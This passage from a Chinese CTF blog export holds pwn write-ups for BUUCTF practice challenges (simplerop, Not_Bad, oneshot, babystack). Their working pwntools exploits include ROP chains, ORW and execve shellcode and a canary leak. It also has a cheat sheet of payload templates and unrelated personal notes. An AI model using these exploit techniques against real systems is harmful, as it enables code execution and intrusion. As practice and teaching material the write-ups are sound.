coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./simplerop&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./simplerop&#39;)        #lib = ELF(&#39;&#39;)    else:        sh = remote(ip,port)        #lib = ELF(&#39;./home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&#39;)    from struct import pack     pop_edx_ecx_ebx = 0x0806e850    payload = cyclic(0x14 + 12)     p = lambda x : pack(&#39;I&#39;, x)    IMAGE_BASE_0 = 0x08048000 # ./simplerop    rebase_0 = lambda x : p(x + IMAGE_BASE_0)    rop = &#39;&#39;    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/bin&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3060)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;     rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += &#39;/sh\x00&#39;    rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret;     rop += rebase_0(0x000a3064)    rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;    rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)    rop += p(0)    rop += p(0)    rop += rebase_0(0x000a3060)    rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret;     rop += p(0x0000000b)    rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret;     sh.sendline(payload + rop)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,25335,0 )</code></pre><h2 id="另一种解法"><a href="#另一种解法" class="headerlink" title="另一种解法"></a>另一种解法</h2><blockquote><p>新姿势 &gt;rop chain后 int 0x80中断从而执行系统调用&gt; execve(/bin/sh)。</p><p>原理：通过一系列 pop|ret 等gadget，使得 eax = 0xb（execve 32 位下的系统调用号），ebx -&gt; /bin/sh， ecx = edx = 0，然后通过 int 0x80 实现系统调用，执行 execve(“/bin/sh”, 0, 0)<br>————————————————<br>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40173126/article/details/83348870" target="_blank" rel="noopener">https://blog.csdn.net/qq_40173126/article/details/83348870</a></p><p>版权声明：本文为CSDN博主「Yof3ng」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>[原文链接])(<a href="https://blog.csdn.net/qq_40173126/article/details/83348870" target="_blank" rel="noopener">https://blog.csdn.net/qq_40173126/article/details/83348870</a>)</p></blockquote><pre><code class="python">#coding:utf-8from pwn import*  p = process(&#39;./simplerop&#39;)  elf = ELF(&#39;./simplerop&#39;)  pop_edx_ecx_ebx = 0x0806eca0  pop_eax = 0x080b7e26  pop_edx = 0x0806ec7a  int_80 = 0x0806c8f5  gadget = 0x080707b9 # mov word ptr [edx],eax  bss = elf.bss()  read_plt = elf.symbols[&#39;read&#39;]  p.recv()  payload = &#39;a&#39;*32 + p32(pop_edx) +p32(bss)+ p32(pop_eax) +&quot;/bin&quot;+ p32(gadget)  payload +=  p32(pop_edx) + p32(bss+4) + p32(pop_eax) + &quot;/sh\x00&quot; + p32(gadget)  payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss) payload += p32(pop_eax) + p32(0xb)  payload += p32(int_80)  p.send(payload)  p.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-ROPgadget -系统调用号</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解密系列笔记</title>
    <link href="/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/"/>
    <url>/2020/02/08/%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1 id="解密系列"><a href="#解密系列" class="headerlink" title="解密系列"></a>解密系列</h1><p>ASCII编码是Unicode字符编码的一部分</p><p>系统dll属于level3，内核运行在level0. </p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>在保护模式下：</p><ul><li>应用程序是不会直接访问物理地址的</li><li>虚拟内存管理器通过虚拟地址的访问请求，控制所有物理地址访问</li><li>每个程序都有独立的4GB寻址空间，不同程序的地址空间是被相互隔离的。</li><li>DLL程序没有自己的“私有”空间，它们称之为动态链接库文件，它们总是被映射到其他应用程序的地址空间中的，作为其他应用程序的一部分运行。</li></ul><p>==简化了内存的管理，并可弥补物理内存的不足，另外可以防止多任务环境下各个应用程序之间的冲突==</p><p>与实地址模式下的“段地址：偏移地址”索引方式类似，虚拟地址也写成“段：偏移量”，但为段选择子。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>个人原则宪法</title>
    <link href="/2020/02/08/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/"/>
    <url>/2020/02/08/%E4%B8%AA%E4%BA%BA%E5%8E%9F%E5%88%99%E5%AE%AA%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="个人原则宪法"><a href="#个人原则宪法" class="headerlink" title="个人原则宪法"></a>个人原则宪法</h1><p>史蒂芬.柯维提出，以原则为导向是以终为始最有效的方法。</p><blockquote><p>李源在解读查理.芒格时说，芒格的思维方式解决了他一直以来困惑的“愚人船”命题——一群人在船舱里掌舵，但他们看不清前方；另一群人在岸上，他们能看见一切，想要为船指引方向，但是无论他们如何叫喊，船里的人都听不见。生活就像一艘愚人船，掌舵人代表过去的我们，岸上的人代表现在的我们。现在我们了解过去，却无法为过去的我们指引方向。芒格不仅是成功的投资大师，更是生活的智者，他总结了一系列“为”与“不为”的清单，作为自己的投资原则。</p><p>作者：土月君<br>链接：<a href="https://www.jianshu.com/p/7cd520b68d5e" target="_blank" rel="noopener">https://www.jianshu.com/p/7cd520b68d5e</a><br>来源：简书</p></blockquote><p>1.保持忠诚，不出轨，不搞暧昧，矛盾冲突通过有效沟通解决。</p><p>2.保持冷静，在愤怒的时候，不出口伤人，不动手伤人，保持深呼吸，直至缓解。</p><p>3.保持学习，尊崇内心的追寻和梦想，不卑不亢，独立思考。</p><p>4.保持爱心，珍惜所拥有的东西，尽可能做到节约。</p><p>5.开源节流，不花无意义的钱，购物前都思考是否必要，是否必须，尽早达到退休存款的4.2%为年开销。</p><p>6.享受生活，享受人生，高光时期不高傲，低谷时期不绝望，珍惜每一天。</p><p>7.保持自信，相信自己，相信亲近的人，相信爱人。</p><blockquote><p>2020/2/8 2:35 第一版</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>-个人原则宪法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ORW-[极客大挑战2019]Not_Bad</title>
    <link href="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/"/>
    <url>/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/</url>
    
    <content type="html"><![CDATA[<h1 id="ORW-极客大挑战2019-Not-Bad"><a href="#ORW-极客大挑战2019-Not-Bad" class="headerlink" title="ORW-[极客大挑战2019]Not_Bad"></a>ORW-[极客大挑战2019]Not_Bad</h1><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203001107437.png" srcset="/img/loading.gif" class="" title="image-20200203001107437"><h2 id="RWX"><a href="#RWX" class="headerlink" title="RWX"></a>RWX</h2><blockquote><ul><li>Linux的文件和目录的权限，有RWX三种。</li><li>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有<strong>浏览目录</strong>的权限。</li><li>w(Write,写入)：对文件而言，具有新增,修改,删除文件内容的权限；对目录来说，具有<strong>新建，删除，修改，移动目录内文件</strong>的权限。</li><li>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说<strong>该用户具有进入目录</strong>的权限</li></ul></blockquote><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203144946071.png" srcset="/img/loading.gif" class="" title="image-20200203144946071"><p><a href="[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)">什么是seccomp</a></p><p>用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>检测一下<code>seccomp-tools dump  ./bad</code></p><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145031485.png" srcset="/img/loading.gif" class="" title="image-20200203145031485"><p>可运行open,read,write，也就是ORW</p><h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145324266.png" srcset="/img/loading.gif" class="" title="image-20200203145324266"><img src="/2020/02/08/ORW-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%5DNot_Bad/image-20200203145300314.png" srcset="/img/loading.gif" class="" title="image-20200203145300314"><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>mmap()函数的主要用途有三个：<br>1、将一个普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，这样用内存读写取代I/O读写，以获得较高的性能；<br>2、将特殊文件进行匿名内存映射，可以为关联进程提供共享内存空间；<br>3、为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br><a href="https://blog.csdn.net/yzy1103203312/article/details/78286360" target="_blank" rel="noopener">原文链接</a></p></blockquote><p>总的来说就是，我们可以在这里写入orw_shellcode然后运行hhh</p><pre><code class="python">    orw_shellcode = shellcraft.open(&quot;./flag&quot;)    orw_shellcode += shellcraft.read(3,0x123000,0x30)    orw_shellcode += shellcraft.write(1,0x123000,0x30)</code></pre><p>read(3,addr,length)，3指从文件目录中读取</p><pre><code class="python">    payload = asm(shellcraft.read(0,0x123000,0x90)) + asm(&quot;mov rax,0x123000;call rax&quot;)    payload = payload.ljust(0x28,&quot;\x00&quot;)    payload += p64(0x400A01)#jmp rsp    payload += asm(&quot;sub rsp,0x30;call rsp&quot;)    sh.sendline(payload)</code></pre><p>这样子，我们溢出之后，先执行jmp rsp，然后读入到0x123000的shellcdoe，读入完成之后执行call rax运行shellcode</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./bad&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./bad&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/robye/Desktop/PWN/libc/64-libc-2.27.so&#39;)    orw_shellcode = shellcraft.open(&quot;./flag&quot;)    orw_shellcode += shellcraft.read(3,0x123000,0x30)    orw_shellcode += shellcraft.write(1,0x123000,0x30)    sh.recvuntil(&quot;fun!&quot;)    payload = asm(shellcraft.read(0,0x123000,0x90)) + asm(&quot;mov rax,0x123000;call rax&quot;)    payload = payload.ljust(0x28,&quot;\x00&quot;)    payload += p64(0x400A01)    payload += asm(&quot;sub rsp,0x30;call rsp&quot;)    sh.sendline(payload)    sleep(0.1)    sh.sendline(asm(orw_shellcode))    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,26591,0)</code></pre><p>向<a href="http://www.qfrost.com/PWN/geek_pwn/" target="_blank" rel="noopener">Qfroest</a>大佬学习</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Shellcode -ORW</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn常用指令</title>
    <link href="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="Pwn常用"><a href="#Pwn常用" class="headerlink" title="Pwn常用"></a>Pwn常用</h1><p><code>ldd filename</code> 读取libc</p><p><code>ROPgadget --binary filename --only &quot;pop|ret&quot;</code></p><p><code>__libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))</code></p><p><code>__libc_start_main = u32(sh.recvuntil(&quot;\xf7&quot;)[-4:])</code></p><p><code>__libc_start_main = u32(sh.recv(4))</code></p><p><code>canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;)) log.success(&quot;canary------&gt;&quot; + hex(canary))</code></p><p>接受成int型地址：<code>str_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p><code>seccomp-tools dump ./filename</code></p><p>找不到flag：<code>grep -rn flag *</code></p><p>32位</p><p>第一个放在rdi 第二个放在rsi 第三个放在rdx</p><p>64位就得</p><h1 id="ubuntu16"><a href="#ubuntu16" class="headerlink" title="ubuntu16"></a>ubuntu16</h1><h2 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h2><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><pre><code class="python">    payload += p32(printf_plt)    payload += p32(start_vuln)    payload += p32(0x080486F8)    payload += p32(elf.got[&#39;__libc_start_main&#39;])</code></pre><h3 id="system-“-bin-sh”"><a href="#system-“-bin-sh”" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><pre><code class="python">payload += p32(system)payload += p32(0)payload += p32(binsh)sh.sendline(payload)</code></pre><h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p32(elf.plt[&#39;write&#39;])payload += p32(pop_esi_edi_ebp_ret)payload += p32(1)payload += p32(elf.got[&#39;__libc_start_main&#39;])payload += p32(4)payload += p32(start_main)</code></pre><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload += p32(elf.plt[&#39;read&#39;])payload += p32(pop3_ret)payload += p32(0)    #从哪里读取payload += p32(bss_addr)payload += p32(0x223) #长度</code></pre><h2 id="64"><a href="#64" class="headerlink" title="64"></a>64</h2><p>1.</p><pre><code class="python">main_arena = u64(io.recv(6).ljust(8,&#39;\x00&#39;))-88log.success(&#39;main arena: &#39;+hex(main_arena))libc_base = main_arena - 0x3c4b20log.success(&#39;libc base: &#39;+hex(libc_base))2.</code></pre><pre><code class="python">libc_base = u64(sh.recv(8)) - 0x3C4B78malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]log.success(&quot;libc_base: &quot; + hex(libc_base))log.success(&quot;__malloc_hook: &quot; + hex(malloc_hook))</code></pre><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.sendline(payload)</code></pre><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;printf&#39;])payload += p64(start_main)</code></pre><h3 id="write-1"><a href="#write-1" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(1)payload += p64(pop_rsi_r15_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(1)payload += p64(elf.plt[&#39;write&#39;])payload += p64(start_main)</code></pre><h1 id="ubuntu18"><a href="#ubuntu18" class="headerlink" title="ubuntu18"></a>ubuntu18</h1><h2 id="32"><a href="#32" class="headerlink" title="32"></a>32</h2><h3 id="read-1"><a href="#read-1" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload =p32(elf.plt[&#39;read&#39;]) payload += p32(pop3_ret) payload += p32(0) payload += p32(base)payload += p32(0x500)</code></pre><h3 id="write-2"><a href="#write-2" class="headerlink" title="write"></a>write</h3><pre><code class="python">payload += p32(elf.plt[&#39;write&#39;])payload += p32(pop3_ret)payload += p32(1)payload += p32(elf.got[&#39;__libc_start_main&#39;])payload += p32(4)payload += p32(start_main)</code></pre><h2 id="64-1"><a href="#64-1" class="headerlink" title="64"></a>64</h2><h3 id="puts"><a href="#puts" class="headerlink" title="puts"></a>puts</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.got[&#39;__libc_start_main&#39;])payload += p64(elf.plt[&#39;puts&#39;])</code></pre><h3 id="system-“-bin-sh”-1"><a href="#system-“-bin-sh”-1" class="headerlink" title="system(“/bin/sh”)"></a>system(“/bin/sh”)</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(binsh)payload += p64(system)sh.sendline(payload)</code></pre><h3 id="read-2"><a href="#read-2" class="headerlink" title="read"></a>read</h3><pre><code class="python">payload += p64(pop_rsi_ret)payload += p64(elf.bss()) payload += p64(elf.plt[&#39;read&#39;])</code></pre><h3 id="open"><a href="#open" class="headerlink" title="open"></a>open</h3><pre><code class="python">payload += p64(pop_rdi_ret)payload += p64(elf.bss()+0x100)payload += p64(pop_rsi_ret)payload += p64(0)payload += p64(elf.plt[&#39;open&#39;])</code></pre><h3 id="open-read-put"><a href="#open-read-put" class="headerlink" title="open_read_put"></a>open_read_put</h3><img src="/2020/02/05/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/image-20200128101042088.png" srcset="/img/loading.gif" class="" title="image-20200128101042088"><pre><code class="python">    payload += p64(pop_rsi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(pop_rsi_ret)    payload += p64(0)    payload += p64(elf.plt[&#39;open&#39;])    payload += p64(pop_rdi_ret)    payload += p64(4)#?    payload += p64(pop_rsi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(elf.plt[&#39;puts&#39;])</code></pre><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h2><p>可参考<a href="http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/" target="_blank" rel="noopener">http://mrbelieve.tech/2020/01/24/ciscn_2019_s_9/</a></p><pre><code class="python">shellcode =&#39;&#39;&#39;xor    eax,eaxpush   eaxpush   0x68732f2f #//shpush   0x6e69622f # /binmov    ebx,espmov    ecx,eaxmov    edx,eaxmov    al,0xbint    0x80xor    eax,eaxinc    eaxint    0x80&#39;&#39;&#39;shellcode =asm(shellcode) #使用shellcraft.sh打不通，估计是因为太长了shell=&quot;sub esp,0x28;call esp&quot;shell =asm(shell)</code></pre><h2 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h2><pre><code class="python">push 0x67616c66mov rdi,rsp push 2pop raxxor rsi,rsipush 32pop rdxsyscallmov rdi,raxmov rsi,rspxor rax,raxsyscallpush 1pop rdipush 1pop raxsyscall</code></pre><pre><code class="python">push   0x42pop    raxinc    ahcqopush   rdxmovabs rdi, 0x68732f2f6e69622fpush   rdipush   rsppop    rsimov    r8, rdxmov    r10, rdxsyscal</code></pre><pre><code class="python">xor    %rsi,%rsipush   %rsimov $0x68732f2f6e69622f,%rdipush   %rdipush   %rsppop    %rdipush  $0x3bpop    %raxcltd   syscall </code></pre><h1 id="不那么熟悉的函数"><a href="#不那么熟悉的函数" class="headerlink" title="不那么熟悉的函数"></a>不那么熟悉的函数</h1><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h2><p><code>void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);</code></p><blockquote><p>参数start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p><p>参数length：代表将文件中多大的部分映射到内存。</p><p>参数prot：映射区域的保护方式。可以为以下几种方式的组合：<br>PROT_EXEC       映射区域可被执行<br>PROT_READ       映射区域可被读取<br>PROT_WRITE     映射区域可被写入<br>PROT_NONE      映射区域不能存取</p><p>参数flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。<br>MAP_FIXED                如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。<br>MAP_SHARED          对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。<br>MAP_PRIVATE            对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。<br>MAP_ANONYMOUS  建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。<br>MAP_DENYWRITE   只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。<br>MAP_LOCKED          将映射区域锁定住，这表示该区域不会被置换（swap）。</p><p>参数fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。</p><p>参数offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。<br>————————————————<br>版权声明：本文为CSDN博主「为幸福写歌」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/yzy1103203312/article/details/78286360" target="_blank" rel="noopener">https://blog.csdn.net/yzy1103203312/article/details/78286360</a></p></blockquote><h1 id="短于68的ropchains"><a href="#短于68的ropchains" class="headerlink" title="短于68的ropchains"></a>短于68的ropchains</h1><pre><code class="python">from struct import pack p = lambda x : pack(&#39;I&#39;, x)IMAGE_BASE_0 = 0x08048000 # ./simpleroprebase_0 = lambda x : p(x + IMAGE_BASE_0)rop = &#39;&#39;rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += &#39;/bin&#39;rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; rop += rebase_0(0x000a3060)rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret; rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += &#39;/sh\x00&#39;rop += rebase_0(0x0002682a) # 0x0806e82a: pop edx; ret; rop += rebase_0(0x000a3064)rop += rebase_0(0x0005215d) # 0x0809a15d: mov dword ptr [edx], eax; ret;rop += pack(&#39;I&#39;, pop_edx_ecx_ebx)rop += p(0)rop += p(0)rop += rebase_0(0x000a3060)rop += rebase_0(0x00072e06) # 0x080bae06: pop eax; ret; rop += p(0x0000000b)rop += rebase_0(0x00026ef0) # 0x0806eef0: int 0x80; ret; </code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>oneshot_tjctf_2016</title>
    <link href="/2020/02/05/oneshot_tjctf_2016/"/>
    <url>/2020/02/05/oneshot_tjctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h1><img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020208419.png" srcset="/img/loading.gif" class="" title="image-20200205020208419"><img src="/2020/02/05/oneshot_tjctf_2016/image-20200205020146218.png" srcset="/img/loading.gif" class="" title="image-20200205020146218"><p>*v4，要用<code>str(elf.got[&#39;__libc_start_main&#39;])</code></p><p>接受要用<code>int(sh.recvuntil(&quot;\n&quot;,True),16)</code></p><p>exp</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./oneshot_tjctf_2016&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./oneshot_tjctf_2016&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    payload = str(elf.got[&#39;__libc_start_main&#39;])    pause()    sh.sendline(payload)    sh.recvuntil(&quot;0x0000&quot;)    __libc_start_main = int(sh.recvuntil(&quot;\n&quot;,True),16)    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    one_gadget = 0xf1147     payload = str( libc  + one_gadget)    sh.sendline(payload)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,29303,0)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>leak_canary-others_babystack</title>
    <link href="/2020/02/04/leak_canary-others_babystack/"/>
    <url>/2020/02/04/leak_canary-others_babystack/</url>
    
    <content type="html"><![CDATA[<h1 id="leak-canary-others-babystack"><a href="#leak-canary-others-babystack" class="headerlink" title="leak_canary-others_babystack"></a>leak_canary-others_babystack</h1><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230127839.png" srcset="/img/loading.gif" class="" title="image-20200204230127839"><p>Full RELRO GOT表只读</p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230141663.png" srcset="/img/loading.gif" class="" title="image-20200204230141663"><p>s申请的是0x80，但读入0x100。并且canary在stack -0x8的地方</p><p>先泄露canary，puts函数在输出时，只有遇到\x00才会结束，用\n覆盖canary的第一字节\x00，从而获得canary</p><p><code>payload = cyclic(0x90-0x8)</code></p><img src="/2020/02/04/leak_canary-others_babystack/image-20200204230829836.png" srcset="/img/loading.gif" class="" title="image-20200204230829836"><pre><code class="python">sh.recvuntil(&quot;iaab\n&quot;)canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))log.success(&quot;canary------&gt;&quot; + hex(canary))</code></pre><p>然后构造payload</p><pre><code class="python">    def printf():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)    def quit():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)    payload = cyclic(0x90-0x8)    store(payload)    printf()    sh.recvuntil(&quot;iaab\n&quot;)    canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))    log.success(&quot;canary------&gt;&quot; + hex(canary))    payload = cyclic(0x90-0x8)    payload += p64(canary)    payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(main)    store(payload)    quit()</code></pre><p><strong>必须要quit了才会继续运行到我们的溢出部分</strong></p><p>后面就是常规了</p><p>exp</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;elf = ELF(&#39;./babystack&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./babystack&#39;)        lib = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        #lib = ELF(&#39;/home/mrbelieve/Desktop/PWN/buu/libc/64-libc-2.23.so&#39;)    pop_rdi_ret = 0x0400a93    main = 0x400908    def store(payload):        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;1&quot;)        sh.sendline(payload)    def printf():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;2&quot;)    def quit():        sh.sendlineafter(&quot;&gt;&gt;&quot;,&quot;3&quot;)    payload = cyclic(0x90-0x8)    store(payload)    printf()    sh.recvuntil(&quot;iaab\n&quot;)    canary =  u64(sh.recv(7).rjust(8,&quot;\x00&quot;))    log.success(&quot;canary------&gt;&quot; + hex(canary))    payload = cyclic(0x90-0x8)     payload += p64(canary)     payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(elf.got[&#39;__libc_start_main&#39;])    payload += p64(elf.plt[&#39;puts&#39;])    payload += p64(main)    store(payload)    quit()    __libc_start_main = u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&#39;\x00&#39;))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    log.success(&quot;libc: &quot; + hex(libc))    log.success(&quot;system: &quot; + hex(system))    log.success(&quot;binsh: &quot; + hex(binsh))    payload = cyclic(0x90-0x8)    payload += p64(canary)    payload += cyclic(0x8)    payload += p64(pop_rdi_ret)    payload += p64(binsh)    payload += p64(system)    store(payload)    quit()    sh.interactive()if __name__ ==  &quot;__main__&quot;:    